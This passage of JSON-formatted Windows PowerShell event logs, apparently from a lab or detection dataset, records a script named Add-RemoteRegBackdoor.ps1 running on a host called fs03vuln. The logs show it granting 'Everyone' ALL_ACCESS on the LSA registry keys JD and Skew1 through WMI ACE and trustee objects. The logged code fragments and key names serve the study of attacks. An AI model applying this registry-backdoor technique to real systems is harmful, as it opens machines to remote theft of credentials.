                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1049\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Calling SetSecurityDescriptor on the key with the newly created Ace\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54724",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Backdooring completed for key\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1051\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Backdooring completed for key\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Backdooring completed for key\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54725",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Backdooring started for key\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1053\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Backdooring started for key\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Backdooring started for key\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54726",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1055\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54727",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1057\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n</string>\n<string>CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Management.ManagementClass\"\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"win32_Ace\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54728",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Creating the trustee WMI object with user '$User'\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1059\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Creating the trustee WMI object with user '$User'\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Creating the trustee WMI object with user 'Everyone'\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54729",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1061\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n</string>\n<string>CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Management.ManagementClass\"\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"win32_Trustee\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54730",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Applying Trustee to new Ace\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1063\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Applying Trustee to new Ace\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Applying Trustee to new Ace\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54731",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1065\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Calling SetSecurityDescriptor on the key with the newly created Ace\"\n</string>",
                "Binary": null
            }
        }
    },
